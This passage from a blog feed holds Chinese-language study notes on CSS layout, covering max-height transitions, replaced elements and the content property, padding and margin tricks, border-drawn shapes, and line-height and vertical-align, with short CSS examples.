absolute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>height: auto</code>使用<code>transition: height 1s</code>不会起作用，但是可以用<code>max-height</code>来模拟</p><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>按照从上而下、自外而内的顺序渲染 DOM 内容。套用本例就是，<br>先渲染父元素，后渲染子元素，是有先后顺序的。因此，当渲染到父元素的时候，子元素的<br>width:100%并没有渲染，宽度就是图片加文字内容的宽度；等渲染到文字这个子元素的时候，<br>父元素宽度已经固定，此时的 width:100%就是已经固定好的父元素的宽度。宽度不够怎么<br>办？溢出就好了，overflow 属性就是为此而生的。</p><h2 id="任意高度元素的展开收起动画"><a href="#任意高度元素的展开收起动画" class="headerlink" title="任意高度元素的展开收起动画"></a>任意高度元素的展开收起动画</h2><p>height的默认值是auto，从0到auto是无法计算的，因此无法形成过渡的动画效果。但是很多时候，展开的元素内容是动态的，高度是不固定的，不能定死<code>height</code>。这个时候可以用<code>max-height</code>，只要保证<code>max-height</code>要比实际内容的高度达即可。<br>（但是要注意，max-height值太大，收起的时候会有延迟的效果）<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">transition</span>: max-height .<span class="number">25s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.element</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">666px</span>; <span class="comment">/* 一个足够大的max-height */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="内联元素"><a href="#内联元素" class="headerlink" title="内联元素"></a>内联元素</h2><p>内联元素的内联，特指“外在盒子”，<code>inline</code>, <code>inline-block</code>, <code>inline-table</code>都是内联元素。内联元素的典型特征就是可以和文字在一行显示。</p><h2 id="幽灵空白节点"><a href="#幽灵空白节点" class="headerlink" title="幽灵空白节点"></a>幽灵空白节点</h2><h1 id="4-盒尺寸四大家族"><a href="#4-盒尺寸四大家族" class="headerlink" title="4. 盒尺寸四大家族"></a>4. 盒尺寸四大家族</h1><h2 id="4-1-content-替换元素"><a href="#4-1-content-替换元素" class="headerlink" title="4.1 content 替换元素"></a>4.1 content 替换元素</h2><p>通过修改某个html属性值就可以修改元素呈现内容的元素，被称为<strong>替换元素</strong>，如<code>&lt;img&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>。</p><p>替换元素的尺寸计算规则：CSS尺寸 &gt; HTML尺寸 &gt; 固有尺寸。如果固有尺寸含有固定的宽高比例，同时我们仅设置了宽度或高度，那么元素会等比显示。</p><ul><li>固有尺寸：内容原本的尺寸</li><li>HTML尺寸：HTML原生属性，如下</li><li>CSS尺寸: width, height, max-width/min-width设置的尺寸<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">"30"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"20"</span> <span class="attr">rows</span>=<span class="string">"5&gt;&lt;/textarea&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><h2 id="4-2-如何理解替换元素-content属性"><a href="#4-2-如何理解替换元素-content属性" class="headerlink" title="4.2 如何理解替换元素 content属性"></a>4.2 如何理解替换元素 content属性</h2><p>在chrome浏览器中，所有的元素都支持content属性。没有src属性的<img src="/2022/02/12/CSS世界/">是非替换元素，而加上了content属性，则变成了替换元素。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 没有设置src的img元素都显示 1.jpg */</span></span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:not(</span><span class="selector-attr">[src]</span>) &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">url</span>(<span class="string">'1.jpg'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过修改content，可以不用js就实现img内容的替换。但是要注意，content属性只改变视觉呈现，当我们保存这张图片时，保存的还是原本src对应的图片。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">url</span>(<span class="string">'2.jpg'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>替换元素和非替换元素的距离有多远？<br>就是src或content的这一点距离。但是<code>content属性</code>生成的文本是无法选中、无法复制的，这对可访问性和SEO都很不友好，<code>content属性</code>只能用来生成一些无关紧要的内容，如装饰性图形或序号。</p><p><br></p><h3 id="4-3-content内容生成技术"><a href="#4-3-content内容生成技术" class="headerlink" title="4.3 content内容生成技术"></a>4.3 content内容生成技术</h3><p><code>content</code>属性几乎都用在<code>:before/:after</code>这里两个微元素中，利用它们来生成辅助元素，实现图形效果。</p><h3 id="4-3-1-清除浮动"><a href="#4-3-1-清除浮动" class="headerlink" title="4.3.1 清除浮动"></a>4.3.1 清除浮动</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-2-字体图标"><a href="#4-3-2-字体图标" class="headerlink" title="4.3.2 字体图标"></a>4.3.2 字体图标</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123; </span><br><span class="line"> <span class="attribute">font-family</span>: <span class="string">"myico"</span>; </span><br><span class="line"> <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.eot"</span>); </span><br><span class="line"> <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.eot#iefix"</span>) <span class="built_in">format</span>(<span class="string">"embedded-opentype"</span>), </span><br><span class="line"> <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.ttf"</span>) <span class="built_in">format</span>(<span class="string">"truetype"</span>), </span><br><span class="line"> <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.woff"</span>) <span class="built_in">format</span>(<span class="string">"woff"</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-home</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">'myico'</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">'家'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-根据img标签上-alt属性生成图片描述信息"><a href="#4-3-3-根据img标签上-alt属性生成图片描述信息" class="headerlink" title="4.3.3 根据img标签上 alt属性生成图片描述信息"></a>4.3.3 根据img标签上 alt属性生成图片描述信息</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">::after</span> &#123; </span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">attr</span>(alt);</span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">  自定义的HTML属性 也可以</span></span><br><span class="line"><span class="comment">  content: attr(data-title);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>; </span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(0,0,0,.5); </span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(100%); </span><br><span class="line">  <span class="attribute">transition</span>: transform .<span class="number">2s</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::after</span> &#123; </span><br><span class="line">  <span class="comment">/* hover时 alt信息显示 */</span> </span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(0); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-4-css实现动态的加载中"><a href="#4-3-4-css实现动态的加载中" class="headerlink" title="4.3.4 css实现动态的加载中.."></a>4.3.4 css实现动态的加载中..</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">正在加载中&lt;dot&gt;...&lt;/dot&gt; </span><br><span class="line"><span class="selector-tag">dot</span> &#123; </span><br><span class="line"> <span class="attribute">display</span>: inline-block; </span><br><span class="line"> <span class="attribute">height</span>: <span class="number">1em</span>; </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">1</span>; </span><br><span class="line"> <span class="attribute">text-align</span>: left; </span><br><span class="line"> <span class="attribute">vertical-align</span>: -.<span class="number">25em</span>; </span><br><span class="line"> <span class="attribute">overflow</span>: hidden; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">dot</span><span class="selector-pseudo">::before</span> &#123; </span><br><span class="line"> <span class="attribute">display</span>: block; </span><br><span class="line"> <span class="attribute">content</span>: <span class="string">'...\A..\A.'</span>; </span><br><span class="line"> <span class="attribute">white-space</span>: pre-wrap; </span><br><span class="line"> <span class="attribute">animation</span>: dot <span class="number">3s</span> infinite step-start both; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">@<span class="keyword">keyframes</span> dot &#123; </span><br><span class="line"> 33% &#123; <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-2em); &#125; </span><br><span class="line"> 66% &#123; <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-1em); &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-padding"><a href="#4-2-padding" class="headerlink" title="4.2 padding"></a>4.2 padding</h2><h3 id="4-2-1-内联元素padding层叠效果"><a href="#4-2-1-内联元素padding层叠效果" class="headerlink" title="4.2.1 内联元素padding层叠效果"></a>4.2.1 内联元素padding层叠效果</h3><p>内联元素的padding在垂直方向，不影响其他元素布局，而出现层叠效果。</p><ul><li><p>高度不那么高的垂直分隔符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> + <span class="selector-tag">a</span><span class="selector-pseudo">:before</span> &#123; </span><br><span class="line"> <span class="attribute">content</span>: <span class="string">""</span>; </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">0</span>; </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">3px</span> <span class="number">1px</span>; </span><br><span class="line"> <span class="attribute">margin-left</span>: <span class="number">6px</span>; </span><br><span class="line"> <span class="attribute">border-left</span>: <span class="number">1px</span> solid gray; </span><br><span class="line">&#125; </span><br><span class="line">&lt;a href=""&gt;登录&lt;/a&gt;&lt;a href=""&gt;注册&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>通过地址栏的hash值和页面HTML中值一样的元素发生锚点定位。我们希望定位的元素，离顶部有一段距离。可以这样，既不影响原来的布局，又下移了50个像素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;&lt;span id="hash"&gt;标题&lt;/span&gt;&lt;/h3&gt; </span><br><span class="line"><span class="selector-tag">h3</span> &#123; </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">30px</span>; </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">14px</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">h3</span> &gt; <span class="selector-tag">span</span> &#123; </span><br><span class="line"> <span class="attribute">padding-top</span>: <span class="number">58px</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-2-2-padding的百分比值"><a href="#4-2-2-padding的百分比值" class="headerlink" title="4.2.2 padding的百分比值"></a>4.2.2 padding的百分比值</h3><p>padding 和 margin 百分比值无论是水平方向还是垂直方向均是相对于宽度计算的！</p><ul><li><p>实现一个正方形</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">25%</span> <span class="number">50%</span>; <span class="comment">/* 宽高2:1的矩形 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现一个宽高比固定为5:1的头图效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123; </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">10%</span> <span class="number">50%</span>; </span><br><span class="line"> <span class="attribute">position</span>: relative; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.box</span> &gt; <span class="selector-tag">img</span> &#123; </span><br><span class="line"> <span class="attribute">position</span>: absolute; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"> <span class="attribute">height</span>: <span class="number">100%</span>; </span><br><span class="line"> <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"> <span class="attribute">top</span>: <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现“三道杠”小图标</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.icon-menu</span> &#123; </span><br><span class="line">  <span class="attribute">display</span>: inline-block; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">140px</span>; <span class="attribute">height</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">35px</span> <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">background-color</span>: currentColor; </span><br><span class="line">  <span class="attribute">background-clip</span>: content-box; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现radio双层原点图形效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.icon-dot</span> &#123; </span><br><span class="line">  <span class="attribute">display</span>: inline-block; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>; <span class="attribute">height</span>: <span class="number">100px</span>; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>; </span><br><span class="line">  <span class="attribute">background-color</span>: currentColor; </span><br><span class="line">  <span class="attribute">background-clip</span>: content-box; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-3-margin"><a href="#4-3-margin" class="headerlink" title="4.3 margin"></a>4.3 margin</h2><h3 id="4-3-1-margin负值"><a href="#4-3-1-margin负值" class="headerlink" title="4.3.1 margin负值"></a>4.3.1 margin负值</h3><ul><li><p>实现一行有3个元素，元素中间有20px的间隙，左右两端没有间隙<br>通过给父容器添加<code>margin: -20px</code>，增加容器的可用宽度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ul</span> &#123;</span><br><span class="line">  <span class="attribute">margin-right</span>: -<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">li</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现左右等高布局，有可能左侧内容多，有可能右侧内容多<br>table-cell实现等高布局</p></li></ul><h3 id="4-3-2-margin合并"><a href="#4-3-2-margin合并" class="headerlink" title="4.3.2 margin合并"></a>4.3.2 margin合并</h3><p>块级元素的上外边距（margin-top）与下外边距（margin-bottom）有时会合并为单个外边距，这样的现象称为“margin 合并”。<strong>注意，这只发生在块级元素的垂直方向</strong>，不包括浮动和绝对定位。</p><p>margin合并的3种场景</p><ul><li>相邻兄弟元素</li><li>父级和第一个/最后一个子元素</li><li>空块级元素的margin合并<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;div&gt;元素高度只有10px, .son的margin-top和margin-bottom合并在一起了 */</span></span><br><span class="line"><span class="selector-class">.father</span> &#123; <span class="attribute">overflow</span>: hidden; &#125; </span><br><span class="line"><span class="selector-class">.son</span> &#123; <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>; &#125; </span><br><span class="line">&lt;div class="father"&gt; </span><br><span class="line"> &lt;div class="son"&gt;&lt;/div&gt; </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p>如果不希望margin合并，可以进行如下操作</p><ul><li>设置垂直方向的 border</li><li>设置垂直方向的 padding</li><li>里面添加内联元素（直接 Space 键空格是没用的）</li><li>设置 height 或者 min-height。</li></ul><p>margin合并的计算规则</p><ul><li>正正取大值，正负值相加，负负最负值</li></ul><h3 id="4-3-3-margin-auto"><a href="#4-3-3-margin-auto" class="headerlink" title="4.3.3 margin: auto"></a>4.3.3 margin: auto</h3><ul><li>如果一侧定值，一侧 auto，则 auto 为剩余空间大小。</li><li>如果两侧均是 auto，则平分剩余空间。<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 实现块级元素的右对齐 */</span></span><br><span class="line"><span class="selector-class">.son</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>但为什么<code>margin: auto</code>无法垂直居中？<br>触发 margin:auto 计算有一个前提条件，元素在对应方向可以自动填充宽高。把.son 元素的 height:100px 去掉，.son 的高度会自动和父元素等高变成 200px 吗？显然不会！因此无法垂直居中。</p><p>但是我们把son设置为绝对定位元素，son的尺寸会自动填充父级元素的可用尺寸。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 绝对定位元素margin: auto实现垂直居中 */</span></span><br><span class="line"><span class="selector-class">.father</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>; <span class="attribute">height</span>:<span class="number">150px</span>; </span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.son</span> &#123; </span><br><span class="line"> <span class="attribute">position</span>: absolute; </span><br><span class="line"> <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">200px</span>; <span class="attribute">height</span>: <span class="number">100px</span>; </span><br><span class="line"> <span class="attribute">margin</span>: auto; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-border"><a href="#4-4-border" class="headerlink" title="4.4 border"></a>4.4 border</h3><ul><li>border-width不支持百分比</li><li><p>border-color默认颜色是color的色值</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*上传图片的带+虚线框按钮，hover直接改变color色值*/</span></span><br><span class="line"><span class="selector-class">.add</span> &#123; </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#ccc</span>; </span><br><span class="line"> <span class="attribute">border</span>: <span class="number">2px</span> dashed; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.add</span><span class="selector-pseudo">:before</span> &#123; </span><br><span class="line"> <span class="attribute">border-top</span>: <span class="number">10px</span> solid; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.add</span><span class="selector-pseudo">:after</span> &#123; </span><br><span class="line"> <span class="attribute">border-left</span>: <span class="number">10px</span> solid; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/* hover 变色 */</span> </span><br><span class="line"><span class="selector-class">.add</span><span class="selector-pseudo">:hover</span> &#123; </span><br><span class="line"> <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>border-color: transparent 增加点击区域大小</p></li><li>图形绘制<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 绘制三角形 */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#f30</span> transparent transparent; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 狭长的三角形*/</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">10px</span> <span class="number">20px</span>; </span><br><span class="line">  <span class="attribute">border-style</span>: solid; </span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#f30</span> transparent transparent; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 梯形 */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10px</span>; <span class="attribute">height</span>: <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span> solid; </span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#f30</span> transparent transparent; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-内联元素与流"><a href="#5-内联元素与流" class="headerlink" title="5. 内联元素与流"></a>5. 内联元素与流</h2><p>内联元素在垂直方向的排版和对齐，都基本离不开基线 baseline</p><h3 id="5-1-line-height"><a href="#5-1-line-height" class="headerlink" title="5.1  line-height"></a>5.1  line-height</h3><p>两条基线之间的间距<br>对于纯文本元素，line-height直接决定了最终高度。而替换内联元素的高度不受line-height影像。</p><ul><li><p>x-height<br>字母x的高度</p></li><li><p>实现单行文本元素“近似”垂直居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>实现多行文本元素“近似”垂直居中</p></li></ul><h3 id="5-2-vertical-align"><a href="#5-2-vertical-align" class="headerlink" title="5.2 vertical-align"></a>5.2 vertical-align</h3><ul><li><p>vertical-align: baseline<br>默认是基线，基线就是字母x的下边缘线</p></li><li><p>vertical-align: middle<br><code>vertical-align: middle</code>指的是基线往上1/2 x-height的高度<br><img src="/2022/02/12/CSS世界/1.png"></p></li><li><p>行距<br>行距 = 行高 - em-box = line-height - font-size</p></li></ul><h3 id="css重置推荐"><a href="#css重置推荐" class="headerlink" title="css重置推荐"></a>css重置推荐</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 不建议全局 * &#123; box-sizing: border-box; &#125; */</span></span><br><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>, <span class="selector-tag">img</span>, <span class="selector-tag">video</span>, <span class="selector-tag">object</span> &#123; </span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>字符串匹配</title>
      <link href="/2022/01/13/LeetCode-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/"/>
      <url>/2022/01/13/LeetCode-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
